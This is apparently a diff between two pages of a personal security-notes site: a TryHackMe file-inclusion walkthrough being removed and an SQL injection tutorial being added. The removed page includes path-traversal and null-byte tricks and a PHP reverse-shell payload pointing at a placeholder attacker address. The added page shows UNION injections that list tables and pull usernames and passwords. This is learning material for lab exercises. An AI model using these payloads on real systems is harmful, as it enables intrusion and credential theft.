@@ -5,7 +5,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>File Inclusion &#8212; The Cyber Toolkit</title>
+    <title>SQL Injection &#8212; The Cyber Toolkit</title>
     
   <link href="../_static/css/theme.css" rel="stylesheet">
   <link href="../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
@@ -52,8 +52,8 @@
     <script async="async" src="../_static/sphinx-thebe.js"></script>
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="Privelige Escalation" href="../Tools/PriveligeEscalation/PriveligeEscalation.html" />
-    <link rel="prev" title="Jr Pen Tester Path" href="JnrPenTester.html" />
+    <link rel="next" title="SSH" href="ssh.html" />
+    <link rel="prev" title="Windows ‘fun’ stuff" href="Windows%20fun.html" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="docsearch:language" content="None">
     
@@ -112,7 +112,7 @@
   TryHackMe Rooms / Walkthrough
  </span>
 </p>
-<ul class="current nav bd-sidenav">
+<ul class="nav bd-sidenav">
  <li class="toctree-l1 has-children">
   <a class="reference internal" href="../HoloLive/HoloLive.html">
    HoloLive
@@ -140,18 +140,18 @@
    </li>
   </ul>
  </li>
- <li class="toctree-l1 current active has-children">
-  <a class="reference internal" href="JnrPenTester.html">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../JnrPenTester/JnrPenTester.html">
    Jr Pen Tester Path
   </a>
-  <input checked="" class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
+  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
   <label for="toctree-checkbox-2">
    <i class="fas fa-chevron-down">
    </i>
   </label>
-  <ul class="current">
-   <li class="toctree-l2 current active">
-    <a class="current reference internal" href="#">
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../JnrPenTester/FileInclusion.html">
      File Inclusion
     </a>
    </li>
@@ -247,54 +247,54 @@
   Hacker Craft
  </span>
 </p>
-<ul class="nav bd-sidenav">
+<ul class="current nav bd-sidenav">
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/TheBasics.html">
+  <a class="reference internal" href="TheBasics.html">
    The Basics
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/Windows%20fun.html">
+  <a class="reference internal" href="Windows%20fun.html">
    Windows ‘fun’ stuff
   </a>
  </li>
- <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/SQLinjection.html">
+ <li class="toctree-l1 current active">
+  <a class="current reference internal" href="#">
    SQL Injection
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/ssh.html">
+  <a class="reference internal" href="ssh.html">
    SSH
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/XSS.html">
+  <a class="reference internal" href="XSS.html">
    XSS
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/LFI.html">
+  <a class="reference internal" href="LFI.html">
    LFI
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/UploadVulns.html">
+  <a class="reference internal" href="UploadVulns.html">
    Upload Vulnerabilities
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/DHCP.html">
+  <a class="reference internal" href="DHCP.html">
    DHCP
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/Shell%20Stabalise.html">
+  <a class="reference internal" href="Shell%20Stabalise.html">
    Stabalising a shell
   </a>
  </li>
  <li class="toctree-l1">
-  <a class="reference internal" href="../Craft/FileTransfer.html">
+  <a class="reference internal" href="FileTransfer.html">
    File Transfer to Machines
   </a>
  </li>
@@ -356,7 +356,7 @@
         <!-- ipynb file if we had a myst markdown file -->
         
         <!-- Download raw file -->
-        <a class="dropdown-buttons" href="../_sources/JnrPenTester/FileInclusion.ipynb"><button type="button"
+        <a class="dropdown-buttons" href="../_sources/Craft/SQLinjection.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                 data-placement="left">.ipynb</button></a>
         <!-- Download PDF via print -->
@@ -387,31 +387,40 @@
             <nav id="bd-toc-nav" aria-label="Page">
                 <ul class="visible nav section-nav flex-column">
  <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#task-8-challenge">
-   Task 8 Challenge
+  <a class="reference internal nav-link" href="#the-basics-of-sql">
+   The Basics of SQL
   </a>
   <ul class="nav section-nav flex-column">
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#flag1">
-     Flag1
-    </a>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#flag2">
-     Flag2
-    </a>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#flag-3">
-     Flag 3
+    <a class="reference internal nav-link" href="#how-do-we-test-for-injection">
+     How Do We Test for Injection?
     </a>
    </li>
   </ul>
  </li>
  <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#flag-4-the-challenge">
-   Flag 4 - The challenge
+  <a class="reference internal nav-link" href="#types-of-sql-injection-in-band">
+   Types of SQL Injection - In Band
   </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#error-based">
+     Error-Based
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#union-based">
+     Union-Based
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#fun-unions">
+       Fun Unions
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
  </li>
 </ul>
 
@@ -423,7 +432,7 @@
         <div class="col-12 col-md-9 pl-md-3 pr-md-0">
             <!-- Table of contents that is only displayed when printing the page -->
             <div id="jb-print-docs-body" class="onlyprint">
-                <h1>File Inclusion</h1>
+                <h1>SQL Injection</h1>
                 <!-- Table of contents -->
                 <div id="print-main-content">
                     <div id="jb-print-toc">
@@ -434,31 +443,40 @@
                         <nav aria-label="Page">
                             <ul class="visible nav section-nav flex-column">
  <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#task-8-challenge">
-   Task 8 Challenge
+  <a class="reference internal nav-link" href="#the-basics-of-sql">
+   The Basics of SQL
   </a>
   <ul class="nav section-nav flex-column">
    <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#flag1">
-     Flag1
-    </a>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#flag2">
-     Flag2
-    </a>
-   </li>
-   <li class="toc-h3 nav-item toc-entry">
-    <a class="reference internal nav-link" href="#flag-3">
-     Flag 3
+    <a class="reference internal nav-link" href="#how-do-we-test-for-injection">
+     How Do We Test for Injection?
     </a>
    </li>
   </ul>
  </li>
  <li class="toc-h2 nav-item toc-entry">
-  <a class="reference internal nav-link" href="#flag-4-the-challenge">
-   Flag 4 - The challenge
+  <a class="reference internal nav-link" href="#types-of-sql-injection-in-band">
+   Types of SQL Injection - In Band
   </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#error-based">
+     Error-Based
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#union-based">
+     Union-Based
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#fun-unions">
+       Fun Unions
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
  </li>
 </ul>
 
@@ -469,118 +487,77 @@
             
               <div>
                 
-  <div class="tex2jax_ignore mathjax_ignore section" id="file-inclusion">
-<h1>File Inclusion<a class="headerlink" href="#file-inclusion" title="Permalink to this headline">¶</a></h1>
-<div class="section" id="task-8-challenge">
-<h2>Task 8 Challenge<a class="headerlink" href="#task-8-challenge" title="Permalink to this headline">¶</a></h2>
-<p>I’m starting with the challenges, as the rest is already walked through in the tasks. No guidance on this one though</p>
-<div class="section" id="flag1">
-<h3>Flag1<a class="headerlink" href="#flag1" title="Permalink to this headline">¶</a></h3>
-<p><img alt="JrPen-FileInclusion_task1.png" src="../_images/JrPen-FileInclusion_task1.png" /></p>
-<p>OK, so the form is broken. If we take a quick look at the source, it’s a get request instead of a POST… smart
-<img alt="JrPen-FileInclusion_GET.png" src="../_images/JrPen-FileInclusion_GET.png" /></p>
-<p>If we can’t use the built in form, theres a few ways around this. The first thing that came to mind was CURL. A quick, easy way to send a request…</p>
-<p>A quick google for the format and I ended up with the below command</p>
-<p><img alt="JrPen-FileInclusion_Curl.png" src="../_images/JrPen-FileInclusion_Curl.png" /></p>
+  <div class="tex2jax_ignore mathjax_ignore section" id="sql-injection">
+<h1>SQL Injection<a class="headerlink" href="#sql-injection" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="the-basics-of-sql">
+<h2>The Basics of SQL<a class="headerlink" href="#the-basics-of-sql" title="Permalink to this headline">¶</a></h2>
+<p>SQL, or “structured query language” is a scripting language used where quering a database.<br>
+What is a database? Its a collection of tables (and a few extra things) which are used to store data.<br>
+What is a table? Think of it like an excel sheet, with columns and rows. Instead of the columns being A,B,C etc however, they are each named. <br></p>
+<p>How do you write SQL?</p>
+<blockquote>
+<div><p>Carefully! A query in the wrong spot is not going to be fun for anyone.</p>
+</div></blockquote>
 <ul class="simple">
-<li><p>-X: The Type of Request</p></li>
-<li><p>-F: A Field=Value string</p></li>
-<li><p>the last string is my target (no flag)</p></li>
+<li><p>A SELECT statement is used to ask for data</p></li>
+<li><p>A INSERT statement is used to add data</p></li>
+<li><p>A UPDATE statement is used to modify existing data</p></li>
+<li><p>A UNION statement is used to join 2 tables for a response</p></li>
+<li><p>A DELETE statement is used to remove data</p></li>
+<li><p>A DROP statement is used to ruin someone’s day……</p></li>
 </ul>
-<p>Those of you playing along at home may wonder why I have 4 “up-one-level” in the path. The simple answer is it was an educated guess. If the are asking for /etc/ then we’re on a linux box. Linux tends to host in /var/www/html, so 3 would be fine. One of the great things about trying to access a directory by ‘returning’ to the root directory, is that even if you overshoot how many levels up you need to go, extras just put you in the exact same spot.</p>
-<p>Finally and see what we get. Scrolling to the bottom of the response, we have a code…. huh. It seems we have found our flag</p>
-<p><img alt="JrPen-FileInclusion_CurlResponse.png" src="../_images/JrPen-FileInclusion_CurlResponse.png" /></p>
-<p>If we had gotten it wrong, we can also see the directory passed back by the webpage. It was the default directory so 3 would have been enough.</p>
-<p>The hints recommend Burp or Fixing the page source, whatever method works for you :-)</p>
+<p><img alt="south-park-its-gone.gif" src="../_images/south-park-its-gone.gif" /></p>
+<div class="section" id="how-do-we-test-for-injection">
+<h3>How Do We Test for Injection?<a class="headerlink" href="#how-do-we-test-for-injection" title="Permalink to this headline">¶</a></h3>
+<p>A SQL injection is when you can modify a query for a purpose it wasnt intended for. Therefore, the test for an Injection vulnerability is to add something that will break a normal query. This could be a single quote ‘, Double quote ” or a semicolon early ;</p>
 <hr>
 </div>
-<div class="section" id="flag2">
-<h3>Flag2<a class="headerlink" href="#flag2" title="Permalink to this headline">¶</a></h3>
-<p>So… We are told to refresh then get this page</p>
-<p><img alt="JrPen-FileInclusion_task2.png" src="../_images/JrPen-FileInclusion_task2.png" /></p>
-<p>Huh… refresh then we arent allowed in… Did someone say cookies?
-Lets take a look at our dev tools
-<img alt="JrPen-FileInclusion_cookieBefore.png" src="../_images/JrPen-FileInclusion_cookieBefore.png" /></p>
-<p>Now, guest sounds kinda boring dont you think? Lets try shake things up as an admin….</p>
-<p><img alt="JrPen-FileInclusion_cookieAfter.png" src="../_images/JrPen-FileInclusion_cookieAfter.png" /></p>
-<p>Close the Dev tools and refresh.
-<img alt="JrPen-FileInclusion_cookieAdmin.png" src="../_images/JrPen-FileInclusion_cookieAdmin.png" /></p>
-<p>Now, isnt that more interesting :-)</p>
-<p>… but wait, theres more. Where’s the input? And we have some exceptions.
-<img alt="JrnPen-FileInclusion_AdminFile.png" src="../_images/JrnPen-FileInclusion_AdminFile.png" /></p>
-<p>It looks like that cookie might not be for an account name. It looks to be our file location… Let’s try that out…</p>
-<p><img alt="JrnPen-FileInclusion_phpext.png" src="../_images/JrnPen-FileInclusion_phpext.png" /></p>
-<p>It looks right, but we arent getting a file. You may notice the first exception has an error “No such file or directory”. The path has a .php added to the end. That’s not what we wanted. As we didnt add it, it likely added by the website. We’ve seen how to escape this before, by adding the null character at the end (%00). Lets give that a go.</p>
-<p><img alt="JrnPen-FileInclusion_Flag2.png" src="../_images/JrnPen-FileInclusion_Flag2.png" /></p>
-<p>Great! We have our flag. A good takeaway from this is “just because the cookie looks like an account name, doesnt mean it is”.</p>
-<hr></div>
-<div class="section" id="flag-3">
-<h3>Flag 3<a class="headerlink" href="#flag-3" title="Permalink to this headline">¶</a></h3>
-<p>Time for challenge 3. Looks like a nice, standard input form.</p>
-<p><img alt="JnrPen-FileInclusion_Challenge3std.png" src="../_images/JnrPen-FileInclusion_Challenge3std.png" /></p>
-<p>Running the standard escape gives a few bits of info</p>
-<p><img alt="JnrPen-FileInclusion_Ch3Exceptions.png" src="../_images/JnrPen-FileInclusion_Ch3Exceptions.png" /></p>
-<ol class="simple">
-<li><p>We have the standard path, great</p></li>
-<li><p>It looks like our special character are being dropped, thats annoying</p></li>
-<li><p>We didnt ask for a .php file, but its looking for one anyway</p></li>
-</ol>
-<p>Ok, so 2 things to work around, lets try the special characters first</p>
-<ul class="simple">
-<li><p>….//….//….//etc//flag3 - Nope</p></li>
-<li><p>../../../”etc/flag3” - Nope</p></li>
-<li><p>../../../”etc/flag3/.” - Nope</p></li>
-</ul>
-<p>Well thats annoying… lets spin up burp and see whats going on…</p>
-<p><img alt="JnrPen-FileInclusion_Ch3stdGet.png" src="../_images/JnrPen-FileInclusion_Ch3stdGet.png" /></p>
-<p>its URL encoding our request as a get, and adding another / to the location.</p>
-<ul class="simple">
-<li><p>Yea, that didnt help…..</p></li>
-</ul>
-<p>Its a GET, Lets try a basic POST, not worry about the arguements, just to see if the method is allowed…</p>
-<p><img alt="JnrPen-FileInclusion_Ch3stdPOST.png" src="../_images/JnrPen-FileInclusion_Ch3stdPOST.png" /></p>
-<p>… What do you know. It is. Finally something ‘interesting’. Now that we know the page accepts POST messages, lets convert our message. About an hour of googling later, I’ve found that burp suite can actually convert for you… thats handy…</p>
-<p><img alt="JnrPen-FileInclusion_Ch3ConvertBody.png" src="../_images/JnrPen-FileInclusion_Ch3ConvertBody.png" /></p>
-<p>Would you look at that; with our post its not dropping the special chars. Nice</p>
-<p><img alt="JnrPen-FileInclusion_Ch3SuccessfulPost.png" src="../_images/JnrPen-FileInclusion_Ch3SuccessfulPost.png" /></p>
-<p>Thats one problem out of the way….</p>
-<p>Now we can focus on the extention. In our last flag we used the NULL method, lets try that here.</p>
-<p><img alt="JnrPen-FileInclusion_Ch3Flag.png" src="../_images/JnrPen-FileInclusion_Ch3Flag.png" /></p>
-<p>That was easier than the first issue… Nice.</p>
-<hr></div>
 </div>
-<div class="section" id="flag-4-the-challenge">
-<h2>Flag 4 - The challenge<a class="headerlink" href="#flag-4-the-challenge" title="Permalink to this headline">¶</a></h2>
-<p>OK, we have a form, looks the same as the others, and we can apply any technique.
-<img alt="JrPen-FileInclusion_Playground.png" src="../_images/JrPen-FileInclusion_Playground.png" /></p>
-<p>This one is harder than it looks though. While there are definately some directory traversal options, the user has been quite locked down.</p>
-<ul class="simple">
-<li><p>Directory Traversal is allowed</p></li>
-<li><p>No rights to anything fun though, /etc/password is ‘empty’, /proc, log poisoning etc have no rights</p></li>
-<li><p>Null Byte doesnt work</p></li>
-</ul>
-<p>Really, all the Local File Exploits are a no-go here, but who says this is local exploits only? We were introduced to RFIs in task 6.</p>
-<p>The first thing we need to do is create a ‘remote’ location. In the real world you would spin up a machine with a public IP, but here we are on the VPN so can host locally. Python has a simple HTTP server which is great for us.</p>
-<p>I have made a new folder that I wish to expose. Then launch the server to host all files I have in th folder. With no arguements it is now hosted on 8000.</p>
-<p><img alt="JrPen-FileInclusion_PythonServer.png" src="../_images/JrPen-FileInclusion_PythonServer.png" /></p>
-<p>Now, to create a file to upload. As the form is already adding the .php extension, we can just create a php script to be executed. Save the file in the folder serving the PHP server.</p>
+<div class="section" id="types-of-sql-injection-in-band">
+<h2>Types of SQL Injection - In Band<a class="headerlink" href="#types-of-sql-injection-in-band" title="Permalink to this headline">¶</a></h2>
+<p>This is the easiest injection to work with. This is when the query can be extracted easily from the site (i.e. pulled directly from the URL) and the result is displayed to the screen.</p>
+<div class="section" id="error-based">
+<h3>Error-Based<a class="headerlink" href="#error-based" title="Permalink to this headline">¶</a></h3>
+<p>Next on the list is ‘error based’. Maybe you dont see the query result on the screen, but you can ennumerate using the error codes in response. While this is harder than In-Band, it can be scripted to make the journey much easier.</p>
+</div>
+<div class="section" id="union-based">
+<h3>Union-Based<a class="headerlink" href="#union-based" title="Permalink to this headline">¶</a></h3>
+<p>Source: <a class="reference external" href="https://tryhackme.com/room/sqlinjectionlm">https://tryhackme.com/room/sqlinjectionlm</a> <br>
+When we want the site to run normally, but give us more data, a UNION based injection is the way to go.</p>
+<p>Let’s start with an example. Lets say we have a shopping site where the item number is shown in the URL. I’ll use Amazon as an example but I’m pretty sure this wont work in the live site…..</p>
 <blockquote>
-<div><p>I picked <br>
-&lt;?php echo shell_exec(“whoami”);?&gt;</p>
+<div><p><a class="reference external" href="https://amazon.com/shopping?product=1337">https://amazon.com/shopping?product=1337</a></p>
 </div></blockquote>
+<p>In this example URL, we can see the parameter “product” is passed through. If we were to take a guess, somewhere in the code of this site is a query ‘select * from products where product = 1337’. First we would peform our tests to confirm this. Once we know this is an injection location, we can try it out.</p>
 <blockquote>
-<div><p>A reverse shell is also an option, but a bit much effort for this challenge <br>
-&lt;?php echo system(“0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/[yourIP]/[yourPort]; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196”); ?&gt;</p>
+<div><p><a class="reference external" href="https://amazon.com/shopping?product=1337">https://amazon.com/shopping?product=1337</a> UNION SELECT 1</p>
 </div></blockquote>
-<p>On the remote site, you can now enter your server address and file to include.</p>
-<p><img alt="JrPen-FileInclusion_FirstRFI.png" src="JnrPenTester/JrPen-FileInclusion_FirstRFI.png" /></p>
-<ol class="simple">
-<li><p>The URL entered in the form</p></li>
-<li><p>The response of the script</p></li>
-<li><p>The file being served from my server</p></li>
-</ol>
-<p>Great! It Works! The challenge wasnt to work out the user running the webserver, it was to run the hostname command. Modify the RFI file to run the ‘hostname’ command instead and the flag is yours :-)</p>
-<hr></div>
+<p>The chances are there is more than one column in the ‘products’ table, we would just keep adding more columns until we got no more errors</p>
+<blockquote>
+<div><p><a class="reference external" href="https://amazon.com/shopping?product=1337">https://amazon.com/shopping?product=1337</a> UNION SELECT 1,2,3,4,5,6</p>
+</div></blockquote>
+<p>Etc, Etc, Etc. Once we have the correct number of columns, we dont get errors any more and can proceed to add fun things. First we need to make sure the original query fails so only our injection is shown (especially if the site only uses the first response). I’ve just set it to 0 here</p>
+<blockquote>
+<div><p><a class="reference external" href="https://amazon.com/shopping?product=0">https://amazon.com/shopping?product=0</a> UNION SELECT 1,2,3,4,5,database()</p>
+</div></blockquote>
+<p>With this injection, wherever the data from column 6 would be, we would instead have our Database schema type.</p>
+<div class="section" id="fun-unions">
+<h4>Fun Unions<a class="headerlink" href="#fun-unions" title="Permalink to this headline">¶</a></h4>
+<blockquote>
+<div><p>0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = ‘sqli_one’</p>
+</div></blockquote>
+<p>This statement will give us all the table names in the DB (replace sqli_one with the schema type from above).</p>
+<blockquote>
+<div><p>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = ‘staff_users’</p>
+</div></blockquote>
+<p>Similar to the previous, this instead gets all column names of a defined table.</p>
+<blockquote>
+<div><p>0 UNION SELECT 1,2,group_concat(username,’:’,password SEPARATOR ‘<br>’) FROM staff_users</p>
+</div></blockquote>
+<p>If you’re lucky enough to find passwords stored in the DB, this union will help you extract them. The concat function just adds strings together, and the SEPARATOR changes concat’s delimiter, in this case making it a HTML break (new line)</p>
+</div>
+</div>
+</div>
 </div>
 
     <script type="text/x-thebe-config">
@@ -596,7 +573,7 @@ Lets take a look at our dev tools
         },
         kernelOptions: {
             kernelName: "python3",
-            path: "./JnrPenTester"
+            path: "./Craft"
         },
         predefinedOutput: true
     }
@@ -608,17 +585,17 @@ Lets take a look at our dev tools
             
                 <!-- Previous / next buttons -->
 <div class='prev-next-area'> 
-    <a class='left-prev' id="prev-link" href="JnrPenTester.html" title="previous page">
+    <a class='left-prev' id="prev-link" href="Windows%20fun.html" title="previous page">
         <i class="fas fa-angle-left"></i>
         <div class="prev-next-info">
             <p class="prev-next-subtitle">previous</p>
-            <p class="prev-next-title">Jr Pen Tester Path</p>
+            <p class="prev-next-title">Windows ‘fun’ stuff</p>
         </div>
     </a>
-    <a class='right-next' id="next-link" href="../Tools/PriveligeEscalation/PriveligeEscalation.html" title="next page">
+    <a class='right-next' id="next-link" href="ssh.html" title="next page">
     <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">Privelige Escalation</p>
+        <p class="prev-next-title">SSH</p>
     </div>
     <i class="fas fa-angle-right"></i>
     </a>
